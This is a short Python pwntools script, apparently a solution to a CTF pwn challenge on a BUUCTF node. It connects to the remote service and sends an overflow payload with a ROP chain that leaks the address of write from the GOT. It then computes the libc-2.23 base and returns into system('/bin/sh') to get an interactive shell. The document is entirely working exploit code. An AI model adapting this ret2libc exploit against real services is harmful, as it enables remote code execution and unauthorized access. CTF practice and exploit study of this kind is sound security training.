from pwn import *
#from LibcSearcher3 import *

#io = process('./pwn')
io = remote('node4.buuoj.cn',28972)
elf = ELF('./pwn')
context.log_level = 'debug'
#raw_input()

payload = b'\x00\x00\x00\x00'
payload += b'\xff'*0x10
io.send(payload)

payload = b'\x61'*0xe7
payload += p32(0xffab0238) # ebp
payload += p32(elf.plt['write'])+p32(0x08048825)+p32(1)+p32(elf.got['write'])+p32(4)

io.send(payload)
io.recvline()
write_addr = u32(io.recv(4))
print(hex(write_addr))

# ---------call main------------------
#libc = LibcSearcher('write',write_addr)
#libc_base_addr = write_addr - libc.dump('write')
#system_addr = libc_base_addr + libc.dump('system')
#bin_sh_addr = libc_base_addr + libc.dump('str_bin_sh')
libc =ELF('./libc-2.23.so')
libc.address = write_addr - libc.symbols['write']
shell_addr = libc.address + 0x3a819 
system_addr = libc.symbols['system']
print(hex(system_addr))
binsh_addr = 0x15902b +libc.address
#binsh = libc.search("/bin/sh").next()

payload = b'\x00\x00\x00\x00'
payload += b'\xff'*0x10
io.send(payload)

#ret_addr = 0x08048502
payload = b'\x61'*0xe7
#payload += b'\x63' *0xc
payload += p32(0xffab0238) # ebp
payload += p32(system_addr)
payload += p32(1)
payload += p32(binsh_addr)

io.send(payload)
io.interactive()
